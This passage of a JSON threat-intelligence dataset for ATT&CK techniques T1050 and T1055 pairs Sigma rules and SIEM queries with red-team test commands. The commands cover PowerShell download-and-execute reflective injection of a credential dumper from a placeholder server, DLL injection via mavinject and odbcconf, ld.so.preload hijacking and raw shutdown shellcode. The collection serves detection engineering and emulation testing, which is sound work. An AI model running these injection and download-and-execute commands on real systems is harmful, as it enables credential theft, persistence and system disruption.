"name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7045)(?=.*(?:.*(?:.*.*\\\\PAExec.*|.*mssecsvc2\\\\.0|.*.*net user.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: New service creation\nid: 7fe71fc9-de3b-432a-8d57-8c809efc10ab\nstatus: experimental\ndescription: Detects creation if a new service\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1050/T1050.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binpath'\n      - Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'new-service'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reason\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: New service creation\nid: 7fe71fc9-de3b-432a-8d57-8c809efc10ab\nstatus: experimental\ndescription: Detects creation if a new service\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1050/T1050.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binpath'\n      - Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'new-service'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reason\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\sc.exe AND CommandLine.keyword:*create* AND CommandLine.keyword:*binpath*) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*new\\\\-service*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/New-service-creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"New service creation\",\\n    \"description\": \"Detects creation if a new service\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1050\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND CommandLine.keyword:*create* AND CommandLine.keyword:*binpath*) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*new\\\\\\\\-service*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND CommandLine.keyword:*create* AND CommandLine.keyword:*binpath*) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*new\\\\\\\\-service*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'New service creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\sc.exe AND CommandLine.keyword:*create* AND CommandLine.keyword:*binpath*) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*new\\\\-service*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\sc.exe\" CommandLine=\"*create*\" CommandLine=\"*binpath*\") OR (Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*new-service*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\sc.exe\" CommandLine=\"*create*\" CommandLine=\"*binpath*\") OR (Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*new-service*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\sc\\\\.exe)(?=.*.*create.*)(?=.*.*binpath.*))|.*(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*.*new-service.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Rare Service Installs\nid: 66bfef30-22a5-4fcd-ad44-8d81e60922ae\ndescription: Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious\n    services\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\n    - car.2013-09-005\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n    timeframe: 7d\n    condition: selection | count() by ServiceFileName < 5 \nfalsepositives: \n    - Software installation\n    - Software updates\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Rare Service Installs\nid: 66bfef30-22a5-4fcd-ad44-8d81e60922ae\ndescription: Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious\n    services\nstatus: experimental\nauthor: Florian Roth\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1050\n    - car.2013-09-005\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n    timeframe: 7d\n    condition: selection | count() by ServiceFileName < 5 \nfalsepositives: \n    - Software installation\n    - Software updates\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Rare-Service-Installs <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Rare Service Installs\",\\n    \"description\": \"Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious services\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1050\",\\n      \"car.2013-09-005\"\\n    ],\\n    \"query\": \"EventID:\\\\\"7045\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"7d\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"7045\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"ServiceFileName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"asc\"\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.doc_count\": {\\n        \"lt\": 5\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Rare Service Installs\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.by.buckets}}\\\\n {{key}} {{doc_count}}\\\\n{{/aggregations.by.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID=\"7045\" | eventstats count as val by ServiceFileName| search val < 5", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"7045\") | chart count() as val by ServiceFileName | search val < 5", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^7045'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1055/T1055.yaml", "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "$mypid = (get-process spoolsv).id\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "$mypid = #{process_id}\nInvoke-DllInjection.ps1 -ProcessID $mypid -Dll T1055.dll\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "$mypid = (get-process spoolsv).id\nInvoke-DllInjection.ps1 -ProcessID $mypid -Dll T1055.dll\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "echo ../bin/T1055.so > /etc/ld.so.preload\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "LD_PRELOAD=/opt/AtomicRedTeam/atomics/T1055/bin/T1055.so ls\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": ".\\bin\\T1055.exe\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", "name": null}, {"source": "data/abilities/credential-access/c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}, "name": "Injects cred dumper exe into an available process"}, {"source": "data/abilities/defense-evasion/a398986f-31b0-436a-87e9-c8e82c028f3c.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "name": "Injects sandcat DLL into an available process"}, {"source": "data/abilities/defense-evasion/a74bc239-a196-4f7e-8d5c-fe8c0266071c.yml", "command": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, "name": "Leverage odbcconf for DLL injection"}, {"source": "data/abilities/defense-evasion/e5bcefee-262d-4568-a261-e8a20855ec81.yml", "command": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, "name": "Leverage Mavinject (signed binary) for DLL injection"}, {"source": "data/abilities/privilege-escalation/0821b0b0-7902-4a7b-8052-80bda5a43684.yml", "command": {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}, "name": "Force shutdown a target system using Process Injection and raw shellcode"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_reflectivepeinjection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_reflectivepeinjection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcode", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcode", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcodemsil", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcodemsil", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/credential_injection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/credential_injection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/psinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/psinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/reflective_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/reflective_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/shinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/shinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/shellcodeinject64", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/shellcodeinject64", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo #{path_to_shared_library} > /etc/ld.so.preload", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo /home/$USER/random.so > /etc/ld.so.preload", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "$mypid = (get-process spoolsv).id\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "$mypid = #{process_id}\nInvoke-DllInjection.ps1 -ProcessID $mypid -Dll T1055.dll\n", "$mypid = (get-process spoolsv).id\nInvoke-DllInjection.ps1 -ProcessID $mypid -Dll T1055.dll\n", "echo ../bin/T1055.so > /etc/ld.so.preload\n", "LD_PRELOAD=/opt/AtomicRedTeam/atomics/T1055/bin/T1055.so ls\n", ".\\bin\\T1055.exe\n", "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}, "powershell/code_execution/invoke_reflectivepeinjection", "powershell/code_execution/invoke_reflectivepeinjection", "powershell/code_execution/invoke_shellcode", "powershell/code_execution/invoke_shellcode", "powershell/code_execution/invoke_shellcodemsil", "powershell/code_execution/invoke_shellcodemsil", "powershell/credentials/credential_injection", "powershell/credentials/credential_injection", "powershell/management/psinject", "powershell/management/psinject", "powershell/management/reflective_inject", "powershell/management/reflective_inject", "powershell/management/shinject", "powershell/management/shinject", "python/management/osx/shellcodeinject64", "python/management/osx/shellcodeinject64", "```", "echo #{path_to_shared_library} > /etc/ld.so.preload", "```", "```", "echo /home/$USER/random.so > /etc/ld.so.preload", "```"], "technique_id": "T1055", "parsed_datasets": [{"Atomic Red Team Test - Process Injection": {"display_name": "Process Injection", "atomic_tests": [{"dependencies": [{"description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll\" -OutFile \"#{dll_payload}\"\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Process Injection via mavinject.exe", "executor": {"elevation_required": true, "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING #{dll_payload}\n", "name": "powershell"}, "description": "Windows 10 Utility To Inject DLLS\n", "input_arguments": {"dll_payload": {"default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll", "type": "Path", "description": "DLL to Inject"}, "process_id": {"default": "(get-process spoolsv).id", "type": "Int", "description": "PID of input_arguments"}}, "dependency_executor_name": "powershell"}, {"description": "PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)\n", "supported_platforms": ["windows"], "name": "Process Injection via PowerSploit", "input_arguments": {"dll_payload": {"default": "T1055.dll", "type": "Path", "description": "DLL to Inject"}, "process_id": {"default": "(get-process spoolsv).id", "type": "Int", "description": "PID of input_arguments"}}, "executor": {"elevation_required": true, "command": "$mypid = #{process_id}\nInvoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}\n", "name": "powershell"}}, {"description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package. \n", "supported_platforms": ["linux"], "name": "Shared Library Injection via /etc/ld.so.preload", "input_arguments": {"path_to_shared_library": {"default": "../bin/T1055.so", "type": "Path", "description": "Path to a shared library object"}}, "executor": {"elevation_required": true, "command": "echo #{path_to_shared_library} > /etc/ld.so.preload\n", "name": "bash"}}, {"description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n", "supported_platforms": ["linux"], "name": "Shared Library Injection via LD_PRELOAD", "input_arguments": {"path_to_shared_library": {"default": "/opt/AtomicRedTeam/atomics/T1055/bin/T1055.so", "type": "Path", "description": "Path to a shared library object"}}, "executor": {"elevation_required": false, "command": "LD_PRELOAD=#{path_to_shared_library} ls\n", "name": "bash"}}, {"description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\n", "supported_platforms": ["windows"], "name": "Process Injection via C#", "input_arguments": {"exe_binary": {"default": "T1055.exe", "type": "Path", "description": "Output Binary"}}, "executor": {"command": ".\\bin\\#{exe_binary}\n", "name": "command_prompt"}}, {"description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nThis works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\\c$ folder.\n", "supported_platforms": ["windows"], "name": "svchost writing a file to a UNC path", "executor": {"elevation_required": true, "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", "name": "command_prompt", "cleanup_command": "del C:\\T1055.txt >nul 2>&1\ndel C:\\svchost.exe >nul 2>&1\n"}}], "attack_technique": "T1055"}}, {"Mitre Stockpile - Injects cred dumper exe into an available process": {"platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}, "description": "Injects cred dumper exe into an available process", "tactic": "credential-access", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7", "name": "Inject Cred dumper into process (Spookier)"}}, {"Mitre Stockpile - Injects sandcat DLL into an available process": {"platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}], "description": "Injects sandcat DLL into an available process", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "name": "Inject Sandcat into process"}}, {"Mitre Stockpile - Leverage odbcconf for DLL injection": {"platforms": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, "description": "Leverage odbcconf for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "name": "Signed Binary Execution - odbcconf"}}, {"Mitre Stockpile - Leverage Mavinject (signed binary) for DLL injection": {"platforms": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, "description": "Leverage Mavinject (signed binary) for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "id": "e5bcefee-262d-4568-a261-e8a20855ec81", "name": "Signed Binary Execution - Mavinject"}}, {"Mitre Stockpile - Force shutdown a target system using Process Injection and raw shellcode": {"platforms": {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}, "description": "Force shutdown a target system using Process Injection and raw shellcode", "tactic": "privilege-escalation", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "id": "0821b0b0-7902-4a7b-8052-80bda5a43684", "name": "Shutdown Target System"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/code_execution/invoke_reflectivepeinjection", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_reflectivepeinjection\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/code_execution/invoke_shellcode", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_shellcode\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/code_execution/invoke_shellcodemsil", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_shellcodemsil\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/credentials/credential_injection", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/credential_injection\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/management/psinject", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/psinject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/management/reflective_inject", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/reflective_inject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "powershell/management/shinject", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/shinject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1055", "Empire Module": "python/management/osx/shellcodeinject64", "Technique": "Process Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/management/osx/shellcodeinject64\":  [\"T1055\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_command_line contains \"*Invoke-DllInjection*\"or process_command_line contains \"C:\\\\windows\\\\sysnative\\\\\"", "product": "Azure Sentinel", "name": "Process Injection Process"}, {"query": "title: CobaltStrike Process Injection\nid: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42\ndescription: Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons\nreferences:\n    - https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f\n    - 